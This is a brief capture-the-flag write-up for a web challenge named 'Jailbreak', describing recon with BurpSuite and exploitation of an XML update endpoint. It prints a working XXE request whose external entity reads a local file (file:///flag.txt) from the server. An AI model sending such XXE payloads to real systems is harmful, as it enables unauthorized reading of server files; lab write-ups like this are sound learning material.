# Jailbreak CTF Write-Up 🕒

## 🟢 Overview
- **Category:** Web
- **Challenge Name:** Jailbreak
- **Tools Used:** Browser, Kali Linux, BurpSuite

## 🔍 Initial Recon
I accessed the challenge at `http://94.237.51.163:49486/` and was greeted by a simple page displaying the current time. 
Clicking around the website I found a page with an update section under /rom. I also noticed this page when I used BurpSuite's site map. One of the first things I noticed about the page was that it used XML, to process the update.
---

## 🧠 Step 2: Vulnerability Discovery

I pressed update on the website to try it out, and sent that POST request to repeater on BurpSuite. After looking at the file in repeater, it was easy to tell that there was an vulnerability around XML. I learned there was an XXE vulnerability here, so I tried common payloads I found after researching online. I ended up using the following payload.
```
POST /api/update HTTP/1.1
Host: 83.136.248.49:56894
Content-Type: application/xml
Content-Length: <adjusted length>

<?xml version='1.0'?>
<!DOCTYPE FirmwareUpdateConfig [
  <!ELEMENT FirmwareUpdateConfig ANY>
  <!ENTITY xxe SYSTEM 'file:///flag.txt'>
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
  </Firmware>
</FirmwareUpdateConfig>
```
And was given the flag in the response section.

🧠 What I Learned
  - More experience with BurpSuite
  - XXE Vulnerabilities

